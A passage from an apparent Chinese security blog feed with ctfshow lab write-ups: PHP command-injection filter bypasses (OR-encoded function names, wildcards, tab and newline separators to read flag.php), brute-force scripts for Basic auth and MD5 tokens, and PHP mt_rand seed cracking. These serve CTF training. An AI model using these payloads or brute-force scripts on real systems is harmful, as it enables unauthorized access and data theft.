class="built_in">chr</span>(i)):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> re.search(pattern, <span class="built_in">chr</span>(j)):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> i &lt; <span class="number">16</span>:</span><br><span class="line">                    hex_i = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    hex_i = <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">if</span> j &lt; <span class="number">16</span>:</span><br><span class="line">                    hex_j = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    hex_j = <span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">                hex_i = <span class="string">&#x27;%&#x27;</span> + hex_i</span><br><span class="line">                hex_j = <span class="string">&#x27;%&#x27;</span> + hex_j</span><br><span class="line">                c = <span class="built_in">chr</span>(<span class="built_in">ord</span>(urllib.parse.unquote(hex_i)) | <span class="built_in">ord</span>(urllib.parse.unquote(hex_j)))</span><br><span class="line">                <span class="keyword">if</span> (c == k):</span><br><span class="line">                    t1 = t1 + hex_i</span><br><span class="line">                    t2 = t2 + hex_j</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(\&quot;&quot;</span> + t1 + <span class="string">&quot;\&quot;|\&quot;&quot;</span> + t2 + <span class="string">&quot;\&quot;)&quot;</span>)</span><br><span class="line"><span class="comment"># system(&#x27;ls&#x27;), (&#x27;system&#x27;)(&#x27;ls&#x27;), (system)(&#x27;ls&#x27;), (&#x27;system&#x27;)(ls) 都可以执行</span></span><br><span class="line"><span class="comment"># 使用构造的字符串时应该按照以下格式:system=(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)</span></span><br><span class="line"><span class="comment"># 其中%13|%60=s ,%19|%60=y ...</span></span><br><span class="line"><span class="comment"># 上面运行的输出格式是: </span></span><br><span class="line"><span class="comment"># (&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;) ----- system</span></span><br><span class="line"><span class="comment"># (&quot;%0c%13&quot;|&quot;%60%60&quot;) ----- ls</span></span><br><span class="line"><span class="comment"># 直接拼接即可,记得使用bp类工具,hackbar会被再次编码</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># (system)(ls)</span><br><span class="line">(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;) (&quot;%0c%13&quot;|&quot;%60%60&quot;) </span><br><span class="line"></span><br><span class="line"># (system)(cat flag.php)</span><br><span class="line">(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)</span><br></pre></td></tr></table></figure><h2 id="web42"><a class="header-anchor" href="#web42">¶</a>web42</h2><ul><li>描述: 命令执行，需要严格的过滤</li></ul><p>似乎被<a href="https://www.cnblogs.com/tinywan/p/6025468.html">重定向</a>, <code>&gt;/dev/null 2&gt;&amp;1</code> 命令表示不回显, 要让命令回显, 可以进行命令分隔, 以此来绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=cat flag.php ||# 理论上 ; , | , || , &amp; , &amp;&amp; 都可以用, 测试得到 ; 和 || 可用</span><br><span class="line">?c=cat flag.php%0a# 换行</span><br></pre></td></tr></table></figure><h2 id="web43"><a class="header-anchor" href="#web43">¶</a>web43</h2><ul><li>描述: 同上</li></ul><p>解决方案就是换个函数, 就过滤了分号和cat而已</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php%0a</span><br><span class="line">?c=tac flag.php ||</span><br></pre></td></tr></table></figure><h2 id="web44"><a class="header-anchor" href="#web44">¶</a>web44</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通配符即可, payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac fla*%0a</span><br><span class="line">?c=tac fla* ||</span><br></pre></td></tr></table></figure><h2 id="web45"><a class="header-anchor" href="#web45">¶</a>web45</h2><ul><li>描述: 同上</li></ul><p>过滤空格, 换一个就行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09fla*%0a</span><br><span class="line">?c=tac%09fla*||</span><br></pre></td></tr></table></figure><h2 id="web46"><a class="header-anchor" href="#web46">¶</a>web46</h2><ul><li>描述: 同上</li></ul><p>上强度了, 但是通配符还有<code>?</code>(没成功), 或者直接<code>\</code>隔开, 空格还有<code>&lt;</code>之类的代替</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac&lt;fla\g.php||</span><br></pre></td></tr></table></figure><h2 id="web47"><a class="header-anchor" href="#web47">¶</a>web47</h2><ul><li>描述: 同上</li></ul><p>没什么影响, 那就继续用上一题payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="web48"><a class="header-anchor" href="#web48">¶</a>web48</h2><ul><li>描述:同上</li></ul><p>诶还是没有, 那就继续用</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>以上这些都能执行命令</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具利用 </tag>
            
            <tag> 绕过 </tag>
            
            <tag> RCE </tag>
            
            <tag> PHP </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_爆破</title>
      <link href="/article/ctfshow-webbasic-baopo/"/>
      <url>/article/ctfshow-webbasic-baopo/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>爆破</h1><hr><h2 id="web21"><a class="header-anchor" href="#web21">¶</a>web21</h2><ul><li>描述: 爆破什么的，都是基操</li></ul><p>抓包可以发现有<code>Authorization</code>字段, 将后面进行base64解码可以得到刚输入的账号密码, 格式为<code>admin:admin</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cache-Control: max-age=0</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br><span class="line">sec-ch-ua: &quot;;Not A Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;88&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br></pre></td></tr></table></figure><p>首先利用burp在<code>Positions</code>界面添加爆破点(反正我是这么叫的)</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240702180550029.png" alt="image-20240702180550029"></p><p>然后在<code>Payloads</code>界面的<code>Payload Sets -&gt; Payload type</code>选择&quot;Custom iterator&quot;, 在下面的<code>Payload Options[Custom iterator]</code>中分别设置:</p><ul><li>Position:1  admin</li><li>Position:2  :</li><li>Position:3  密码字典</li></ul><blockquote><p>就是构建 admin:密码 的爆破payload</p></blockquote><p>然后在<code>Payload Precessing</code>增加一个base64加密, 如下, 然后取消勾选最底下的<code>URL-encode these characters</code></p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240702181449975.png" alt="image-20240702181449975"></p><p>最后点击<code>Start attack</code>即可, 爆破出来是<code>admin:shark63</code></p><p>脚本也是一个不错的选择:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2020-11-20 19:16:49</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2020-11-20 20:28:42</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://41a801fe-a420-47bc-8593-65c3f26b7efa.chall.ctf.show/index.php&#x27;</span></span><br><span class="line"><span class="comment"># URL换成实际的靶场网址</span></span><br><span class="line"></span><br><span class="line">password = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用字典</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data = f.readline() </span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">    password.append(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> password:</span><br><span class="line">strs = <span class="string">&#x27;admin:&#x27;</span>+ p[:-<span class="number">1</span>]</span><br><span class="line">header=&#123;</span><br><span class="line"><span class="string">&#x27;Authorization&#x27;</span>:<span class="string">&#x27;Basic &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(base64.b64encode(strs.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">&#125;</span><br><span class="line">rep =requests.get(url,headers=header)</span><br><span class="line">time.sleep(<span class="number">0.2</span>)</span><br><span class="line"><span class="keyword">if</span> rep.status_code ==<span class="number">200</span>:</span><br><span class="line"><span class="built_in">print</span>(rep.text)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web22"><a class="header-anchor" href="#web22">¶</a>web22</h2><ul><li>描述: 域名也可以爆破的，试试爆破这个ctf.show的子域名</li></ul><p>一般可以用在线子域名挖掘或者本地的子域名挖掘机</p><h2 id="web23"><a class="header-anchor" href="#web23">¶</a>web23</h2><ul><li>描述: 还爆破？这么多代码，告辞！</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析代码: token被 md5 加密, 且它的<code>第一位 = 第十四位 = 第十七位</code>, 化为整数后<code>(第一位 + 第十四位 + 第十七位) / 第一位 = 第三十一位</code>则可获得 flag, 无脑遍历算了, 先试试两个位置的, 结果真爆出来了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        url = <span class="string">&quot;https://669fe72a-3524-4044-96f5-670a7732e87f.challenge.ctf.show/?token=&quot;</span> + <span class="built_in">str</span>(i) + <span class="built_in">str</span>(j)</span><br><span class="line">        req = requests.get(url=url).text</span><br><span class="line">        <span class="comment"># 使用requests库中的get方法来获取指定url的内容，并返回该内容的文本形式。</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ctfshow&quot;</span> <span class="keyword">in</span> req:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;the flag is:&quot;</span> + req + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;the poc is:&quot;</span> + url)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;now try:&quot;</span> + <span class="built_in">str</span>(i) + <span class="built_in">str</span>(j))</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="web24"><a class="header-anchor" href="#web24">¶</a>web24</h2><ul><li>描述: 爆个🔨</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:26:39</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 13:53:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>伪随机数还给了种子, 这还不会爆? 传值即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="comment">// 1155388967</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web25"><a class="header-anchor" href="#web25">¶</a>web25</h2><ul><li>描述: 爆个🔨，不爆了</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:56:57</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 15:47:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>种子涉及到flag, 不能直接求到, 而<code>if((!$rand))</code> 要使这个为真，就要让 <code>$rand=0</code>而 <code>$rand = intval($r)-intval(mt_rand())</code> , 所以要得到随机数才能构造 <code>$r=$mt_rand()</code></p><p>我挺不理解怎么敢写<code>echo $rand;</code>的, 传入r=0可以得到随机数的相反数-243274477 (每个人似乎不同)</p><p>下载<a href="https://github.com/openwall/php_mt_seed">php_mt_seed</a>解压到linux系统(用的kali, windows没试过), 本目录下执行<code>make</code>,会多出一个可执行文件php_mt_seed, 然后执行<code>./php_mt_seed 243274477</code>即可</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240702201207167.png" alt="image-20240702201207167"></p><p>这就需要写一个 php 脚本来测试是哪个种子第一次就得到这个随机数, 然后对其中一个可能的种子请求两次并求和得到 token 的值, 都拿到了, 就可以传入对应的r和token了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$num</span> = <span class="number">1162957153</span>;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$num</span> = <span class="number">3045777377</span>;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$a1</span> = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="variable">$a2</span> = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="variable">$a3</span> = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a1</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a2</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a3</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="variable">$a2</span> + <span class="variable">$a3</span>).<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="web26"><a class="header-anchor" href="#web26">¶</a>web26</h2><ul><li>描述: 这个可以爆</li></ul><p>这个进去之后是安装界面, 在点击&quot;确认无误, 开始安装&quot;后对返回包进行抓包就能拿下flag</p><p>或者先填入默认信息, 然后对pass进行爆破,爆破得到密码7758521</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240702213427481.png" alt="image-20240702213427481"></p><h2 id="web27"><a class="header-anchor" href="#web27">¶</a>web27</h2><ul><li>描述: CTFshow菜鸡学院招生啦！</li></ul><p>登录界面可以下载到录取名单, 然后还有一个&quot;学生学籍信息查询系统&quot;; 下载下来的list中有姓名和部分身份证号(缺少日期), 应该就是利用爆破爆破出身份证号获得或者重置密码</p><p>burp自带日期爆破, 选择然后设置格式就好了</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240702220146056.png" alt="image-20240702220146056"></p><p>爆破出来的结果: 高先伊  621022199002015237  学号02015237  密码为身份证号, 登录拿到flag</p><h2 id="web28"><a class="header-anchor" href="#web28">¶</a>web28</h2><ul><li>描述: 大海捞针</li></ul><p>后缀是<code>/0/1/2.txt</code>, 无论怎么修改2.txt部分都会演变为无限重定向, 只能对前两个数字进行爆破</p><p>在传参处增加两个爆破点, <code>Attack type</code>选择&quot;Cluster bomb&quot;</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240702221733584.png" alt="image-20240702221733584"></p><p><code>Payload type</code>选择Number, 填写1-100, 两个爆破点是分开设置的</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240702221844411.png" alt="image-20240702221844411"></p><p>爆破得到结果为<code>/72/20/</code>, 访问得到flag</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具利用 </tag>
            
            <tag> 爆破 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_信息收集</title>
      <link href="/article/ctfshow-webbasic-information-gathering/"/>
      <url>/article/ctfshow-webbasic-information-gathering/</url>
      
